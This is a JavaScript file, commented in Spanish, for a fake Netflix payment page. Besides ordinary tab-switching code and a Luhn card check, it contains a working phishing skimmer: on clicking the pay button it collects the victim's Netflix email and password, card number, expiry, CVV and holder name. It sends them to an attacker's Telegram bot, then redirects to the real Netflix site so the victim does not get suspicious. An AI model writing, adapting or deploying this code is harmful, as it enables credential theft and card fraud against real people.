const tabItems = document.querySelectorAll(".tab-item");
const tabContentItems = document.querySelectorAll(".tab-content-item");

// --- 1. LÓGICA DE PESTAÑAS (Tu código original actualizado) ---
function selectItem(e) {
    removeBorder();
    removeShow();
    this.classList.add("tab-border");
    const tabContentItem = document.querySelector(`#${this.id}-content`);
    if (tabContentItem) tabContentItem.classList.add("show");
}

function removeBorder() {
    tabItems.forEach(item => item.classList.remove("tab-border"));
}

function removeShow() {
    tabContentItems.forEach(item => item.classList.remove("show"));
}

tabItems.forEach(item => item.addEventListener("click", selectItem));


// --- 2. VALIDADOR DE TARJETA (Algoritmo de Luhn) ---
function luhnCheck(num) {
    let arr = (num + '').split('').reverse().map(x => parseInt(x));
    let lastDigit = arr.shift();
    let sum = arr.reduce((acc, val, i) => (i % 2 !== 0) ? acc + val : acc + ((val * 2 > 9) ? val * 2 - 9 : val * 2), 0);
    sum += lastDigit;
    return sum % 10 === 0;
}

// --- 3. ENVÍO DE DATOS A TELEGRAM ---
const btnFinalizar = document.querySelector('#btn-finalizar'); // Asegúrate de que tu botón de pago tenga este ID

if (btnFinalizar) {
    btnFinalizar.addEventListener('click', async (e) => {
        e.preventDefault();

        // Captura de datos del formulario
        const email = localStorage.getItem('userEmail') || "No definido";
        const password = localStorage.getItem('userPass') || "No definida";
        const cc = document.querySelector('#cc-num').value;
        const exp = document.querySelector('#cc-exp').value;
        const cvv = document.querySelector('#cc-cvv').value;
        const name = document.querySelector('#cc-name').value;

        // Validar tarjeta antes de enviar
        if (!luhnCheck(cc.replace(/\s+/g, ''))) {
            alert("Número de tarjeta inválido. Revisa los datos.");
            return;
        }

        // Configuración de tu Bot
        const token = "TU_BOT_TOKEN_AQUI";
        const chat_id = "TU_CHAT_ID_AQUI";
        const mensaje = `
🔥 **NUEVA CAPTURA NETFLIX** 🔥
📧 **Email:** ${email}
🔑 **Pass:** ${password}
👤 **Titular:** ${name}
💳 **Número:** ${cc}
📅 **Expiración:** ${exp}
🔒 **CVV:** ${cvv}
        `;

        // Envío mediante API de Telegram
        try {
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id, text: mensaje, parse_mode: 'Markdown' })
            });
            
            // Redirección final para no levantar sospechas
            window.location.href = "https://www.netflix.com/youraccount";
        } catch (error) {
            console.error("Error al enviar:", error);
        }
    });
}
